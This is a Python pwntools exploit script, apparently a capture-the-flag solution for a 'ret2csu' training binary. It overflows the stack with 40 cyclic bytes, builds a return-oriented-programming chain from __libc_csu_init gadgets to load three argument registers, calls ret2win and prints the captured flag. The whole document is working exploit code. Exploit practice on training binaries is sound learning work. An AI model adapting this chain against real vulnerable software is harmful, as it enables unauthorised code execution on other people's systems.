#!/bin/python3

from pwn import *

context.clear(arch='amd64')
filename = './ret2csu'

elf = ELF(filename)
io = process(filename)

# variables

dead = p64(0xdeadbeefdeadbeef)
cafe = p64(0xcafebabecafebabe)
dood = p64(0xd00df00dd00df00d)

# gadgets
r1 = ROP(elf)

csu_mov = p64(0x400680)
csu_pop = p64(0x40069a)         # pop rbx, rbp, r12, r13, r14, r15; ret;
csu_r12 = p64(0x600e30)         # r12(.dyn) + rbx(0x3) * 8
csu_rbx = p64(0x3)              # 0x3 * 8 = offset from .dyn to fini@dyn
csu_rbp = p64(0x4)              # needed for: add rbx, 0x1; cmp rbp, rbx; jne csu_mov;
csu_fil = p64(0x0)
pop_rdi = p64(r1.rdi.address)   # pop rdi; ret;
r2w_plt = p64(elf.plt.ret2win)

r1.raw(cyclic(40))
r1.raw(csu_pop)

r1.raw(csu_rbx)
r1.raw(csu_rbp)
r1.raw(csu_r12)

r1.raw(dead)     # arg1
r1.raw(cafe)     # arg2
r1.raw(dood)     # arg3
r1.raw(csu_mov)

payload = b""
payload += r1.chain()

# runs through csu pop chain again, fill with 0s
payload += csu_fil * 7 

r2 = ROP(elf)
r2.raw(pop_rdi) # csu only moves over dword [mov edi, r13d]
r2.raw(dead)

r2.raw(r2w_plt)

payload += r2.chain()

io.recvuntil('> ')
io.sendline(payload)
io.recvuntil('!\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))